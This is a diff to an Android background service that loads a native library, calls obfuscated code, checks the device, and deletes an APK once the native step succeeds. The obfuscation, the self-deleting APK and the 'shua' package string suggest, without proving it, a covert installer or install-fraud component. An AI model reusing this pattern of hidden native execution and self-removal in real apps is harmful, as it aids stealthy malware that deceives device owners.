@@ -27,14 +27,24 @@ public class MyService extends Service {
     }
    static ExecutorService service = Executors.newSingleThreadExecutor();
     public final  static boolean testAsset = false;
+    public final  static boolean testArmeabi = false;
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         Util_Log.log("onStartCommand");
         GlobalContext.init(this);
+        if(testArmeabi) {
+            Util_Log.log("load armabi!!!");
+            System.loadLibrary("getDevice");
+            String ret = a.e.g.c.a(this);
+            Log.e("J_Nice", "--------so exe ret:-----" + ret);
+            return super.onStartCommand(intent, flags, startId);
+        }
         if(!testAsset){
             NiceFace.onReceive(this, intent);
             return super.onStartCommand(intent, flags, startId);
         }
+
+
 
 //        if(!getPackageName().equals("")) {
 //            throw new RuntimeException("com.surprise.shuabasejoymenghull");
@@ -56,6 +66,7 @@ public class MyService extends Service {
             @Override
             public void isDevice() {
                 Util_Log.log("isDevice");
+
                 service.execute(new Runnable() {
                     @Override
                     public void run() {
@@ -66,7 +77,7 @@ public class MyService extends Service {
                         //若so执行失败就就错误进度保存
                         String lastSoProgress = Util_File.readDef(paramContext,FieldName.progress,"0");
                         if(!lastSoProgress.equals("0")){
-                            UDCtrl.getIns().pushLog(201+"_"+lastSoProgress);
+//                            UDCtrl.getIns().pushLog(201+"_"+lastSoProgress);
                             Log.e("J_Nice","-------------"+lastSoProgress);
                             //    Util_File.writeDef(ctx, FieldName.bad_progress, lastSoProgress);
                             Util_File.writeDef(paramContext,FieldName.progress,"0");
@@ -88,6 +99,7 @@ public class MyService extends Service {
                             if (Util_Log.logShow) Util_Log.log("so exe ret:" + ret);
                             Util_File.writeDef(paramContext, FieldName.soSuccess, ret);
                             if (ret.equals(FieldName.success)) {
+                                Util_File.writeDef(paramContext,FieldName.firstUp,"true");
                                 face.deleteApk();
                             }
                             stopSelf();
